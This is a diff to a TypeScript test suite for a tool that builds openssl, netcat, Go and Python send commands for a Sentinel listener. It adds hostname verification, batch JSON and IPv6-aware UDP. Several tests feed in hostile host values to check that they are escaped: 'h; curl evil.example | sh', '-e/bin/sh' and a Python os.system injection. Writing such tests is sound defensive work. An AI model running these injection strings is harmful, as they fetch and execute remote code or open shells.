@@ -7,6 +7,7 @@ import {
   endpointLabel,
   goSnippet,
   impliedFraming,
+  jsonBatchExample,
   jsonExample,
   netcatCommand,
   protobufExamplesFit,
@@ -85,13 +86,13 @@ describe('send guide', () => {
     for (const [name, sample] of Object.entries(samples)) {
       expect([name, sample.includes('curl'), sample.includes('evil')]).toEqual([name, false, false]);
     }
-    expect(samples.openssl).toContain('-connect sentinel.example:6000 -servername sentinel.example -CAfile ca.pem');
+    expect(samples.openssl).toContain('-connect sentinel.example:6000 -servername sentinel.example -verify_hostname sentinel.example -CAfile ca.pem');
     expect(samples.go).toContain('ServerName: "sentinel.example"');
     expect(samples.python).toContain('server_hostname="sentinel.example"');
 
     // Before it runs there is no host, so the placeholder is the name, not the stale setting.
     const waiting = sendTarget(feed('tcp', config))!;
-    expect(tlsTestCommand(waiting)).toContain('-servername LISTENER_HOST');
+    expect(tlsTestCommand(waiting)).toContain('-servername LISTENER_HOST -verify_hostname LISTENER_HOST');
     expect(goSnippet(waiting)).toContain('ServerName: "LISTENER_HOST"');
     expect(pythonSnippet(waiting)).toContain('server_hostname="LISTENER_HOST"');
   });
@@ -171,6 +172,13 @@ describe('send guide', () => {
     expect(netcatCommand({ ...tcpJson, format: 'cot', framing: 'xmlevent' })).toBeNull();
     expect(netcatCommand({ ...tcpJson, mode: 'connect' })).toBeNull();
     expect(JSON.parse(jsonExample()).sourceEntityId).toBeTruthy();
+    // The same line may carry up to 100 observations as an array.
+    const batch = JSON.parse(jsonBatchExample());
+    expect(Array.isArray(batch)).toBe(true);
+    expect(batch.length).toBeGreaterThan(1);
+    expect(batch.length).toBeLessThanOrEqual(100);
+    expect(batch[0]).toEqual(JSON.parse(jsonExample()));
+    expect(jsonBatchExample()).not.toContain('\n');
     expect(goSnippet(target())).toContain('protodelim.MarshalTo');
     expect(goSnippet(target({ protocol: 'udp', framing: 'message' }))).toContain('net.Dial("udp"');
     expect(pythonSnippet(target())).toContain('varint(len(data)) + data');
@@ -182,7 +190,7 @@ describe('send guide', () => {
     expect(endpointLabel(target({ host: '' }))).toBe('listener:6000/tcp');
     expect(goSnippet(target({ host: '2001:db8::1' }))).toContain('net.Dial("tcp", "[2001:db8::1]:6000")');
     // The brackets are a shell pattern (zsh refuses an unquoted one), so the address is quoted.
-    expect(tlsTestCommand(jsonTarget({ tls: true, host: '2001:db8::1' }))).toContain("-connect '[2001:db8::1]:6000' -servername 2001:db8::1");
+    expect(tlsTestCommand(jsonTarget({ tls: true, host: '2001:db8::1' }))).toContain("-connect '[2001:db8::1]:6000' -servername 2001:db8::1 -verify_hostname 2001:db8::1");
   });
 
   describe('Go', () => {
@@ -311,19 +319,23 @@ describe('send guide', () => {
 
     it('sends a UDP datagram as one whole message with no length prefix', () => {
       const udp = pythonSnippet(target({ protocol: 'udp', framing: 'message', port: 10110 }));
-      expect(udp).toContain('socket.SOCK_DGRAM');
-      expect(udp).toContain('s.sendto(data, ("h", 10110))');
+      // The first address getaddrinfo finds, so an IPv6 listener works as well as an IPv4 one.
+      expect(udp).toContain('family, socktype, proto, _, addr = socket.getaddrinfo("h", 10110, type=socket.SOCK_DGRAM)[0]');
+      expect(udp).toContain('with socket.socket(family, socktype, proto) as s:');
+      expect(udp).toContain('s.sendto(data, addr)');
+      expect(udp).not.toContain('AF_INET');
+      expect(pythonSnippet(target({ protocol: 'udp', framing: 'message', host: '2001:db8::1' }))).toContain('socket.getaddrinfo("2001:db8::1", 6000, type=socket.SOCK_DGRAM)');
       expect(udp).not.toContain('varint');
       expect(udp).not.toContain('ssl');
     });
   });
 
   it('tests TLS JSON with openssl', () => {
-    const base = `echo '${jsonExample()}' | openssl s_client -quiet -no_ign_eof -verify_return_error -connect h:6000 -servername h -CAfile ca.pem`;
+    const base = `echo '${jsonExample()}' | openssl s_client -quiet -no_ign_eof -verify_return_error -connect h:6000 -servername h -verify_hostname h -CAfile ca.pem`;
     expect(tlsTestCommand(jsonTarget({ tls: true }))).toBe(base);
     // Client certificate flags only when the listener asks for one.
     expect(tlsTestCommand(jsonTarget({ tls: true, requireClientCert: true }))).toBe(`${base} -cert client.pem -key client.key`);
-    expect(tlsTestCommand(jsonTarget({ tls: true, host: '' }))).toContain('-connect LISTENER_HOST:6000 -servername LISTENER_HOST');
+    expect(tlsTestCommand(jsonTarget({ tls: true, host: '' }))).toContain('-connect LISTENER_HOST:6000 -servername LISTENER_HOST -verify_hostname LISTENER_HOST');
     // Only JSON lines over TCP with TLS.
     expect(tlsTestCommand(jsonTarget({ tls: true, protocol: 'udp' }))).toBeNull();
     expect(tlsTestCommand(target({ tls: true }))).toBeNull();
@@ -366,10 +378,10 @@ describe('send guide', () => {
 
       const openssl = (host: string) => tlsTestCommand(jsonTarget({ tls: true, host }))!;
       expect(openssl('h; curl evil.example | sh')).toBe(
-        `echo ${quoted} | openssl s_client -quiet -no_ign_eof -verify_return_error -connect 'h; curl evil.example | sh:6000' -servername 'h; curl evil.example | sh' -CAfile ca.pem`,
+        `echo ${quoted} | openssl s_client -quiet -no_ign_eof -verify_return_error -connect 'h; curl evil.example | sh:6000' -servername 'h; curl evil.example | sh' -verify_hostname 'h; curl evil.example | sh' -CAfile ca.pem`,
       );
-      expect(openssl("o'brien")).toContain("-connect 'o'\\''brien:6000' -servername 'o'\\''brien' -CAfile");
-      expect(openssl('sentinel.example')).toContain('-connect sentinel.example:6000 -servername sentinel.example');
+      expect(openssl("o'brien")).toContain("-connect 'o'\\''brien:6000' -servername 'o'\\''brien' -verify_hostname 'o'\\''brien' -CAfile");
+      expect(openssl('sentinel.example')).toContain('-connect sentinel.example:6000 -servername sentinel.example -verify_hostname sentinel.example');
     });
 
     it('stops a host that begins with a dash from being read as an option', () => {
@@ -377,7 +389,7 @@ describe('send guide', () => {
       expect(netcatCommand(jsonTarget({ host: '-e/bin/sh' }))).toBe(`echo ${quoted} | nc -w1 -- '-e/bin/sh' 6000`);
       expect(netcatCommand(jsonTarget({ host: '-x', protocol: 'udp' }))).toBe(`echo ${quoted} | nc -u -w1 -- -x 6000`);
       // openssl takes what follows -connect and -servername as its value, whatever it looks like.
-      expect(tlsTestCommand(jsonTarget({ tls: true, host: '-x' }))).toContain('-connect -x:6000 -servername -x -CAfile');
+      expect(tlsTestCommand(jsonTarget({ tls: true, host: '-x' }))).toContain('-connect -x:6000 -servername -x -verify_hostname -x -CAfile');
       expect(netcatCommand(jsonTarget({ host: 'a-b' }))).not.toContain('--');
     });
 
@@ -420,7 +432,7 @@ describe('send guide', () => {
       const host = 'x", 1); __import__("os").system("id"); ("';
       const literal = '"x\\", 1); __import__(\\"os\\").system(\\"id\\"); (\\""';
       expect(pythonSnippet(target({ host }))).toContain(`socket.create_connection((${literal}, 6000))`);
-      expect(pythonSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain(`s.sendto(data, (${literal}, 6000))`);
+      expect(pythonSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain(`socket.getaddrinfo(${literal}, 6000, type=socket.SOCK_DGRAM)`);
       const tls = pythonSnippet(target({ host, tls: true }));
       expect(tls).toContain(`socket.create_connection((${literal}, 6000))`);
       expect(tls).toContain(`server_hostname=${literal}`);
@@ -450,6 +462,12 @@ describe('send guide', () => {
       for (const c of COUNTERS) {
         expect(c.help.length).toBeGreaterThan(20);
       }
+    });
+
+    it('says what the OS drops, and where', () => {
+      expect(COUNTERS.find((c) => c.key === 'kernelDropped')!.help).toBe(
+        'Datagrams the operating system dropped on this socket before Sentinel read them, usually because the receive buffer was full (Linux only).',
+      );
     });
 
     it('applies each counter to the connections that can raise it', () => {
